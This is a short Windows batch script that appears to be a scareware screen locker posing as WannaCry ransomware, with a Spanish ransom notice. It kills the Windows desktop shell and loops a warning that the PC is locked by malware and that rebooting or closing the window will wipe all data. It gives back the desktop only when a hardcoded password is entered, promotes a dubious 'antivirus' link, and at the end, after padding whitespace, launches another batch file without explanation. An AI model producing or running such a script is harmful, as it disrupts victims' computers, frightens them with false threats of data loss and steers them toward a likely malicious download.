color 0A
@echo off 
title WannaCry?
taskkill /f /im explorer.exe 
:bucle 
cls    
echo =============================================           
echo            LEE CUIDADOSAMENTE
echo =============================================
echo  - que paso?
echo  - su dispositivo ha sido bloqueado por nuestro malware.
echo  - No reiniciar la computadora
echo  - Al reiniciar el dispositivo se formateara la pc y todos sus datos se perderan para siempre
echo  - Si usted cierra esta ventana se bloqueara su computadora
echo  - Tienes un intento para escribir una contraseña, si no logra acertar tambien perdera todo.
echo  - puede usar este antivirus para prevenir situaciones asi en el futuro https://antiviruson-cmd.jimdosite.com/.
echo =============================================
echo  - Suerte BlackBastards
echo =============================================
set /p pass= Escriba aqui el password: 
if %pass%==afraid (goto passcorrecto) ELSE (goto bucle)
:passcorrecto
echo Felicidades! El password es correcto.
start explorer.exe
pause
exit

start fhf-free-main-menu.bat













start fhf-free-main-menu.bat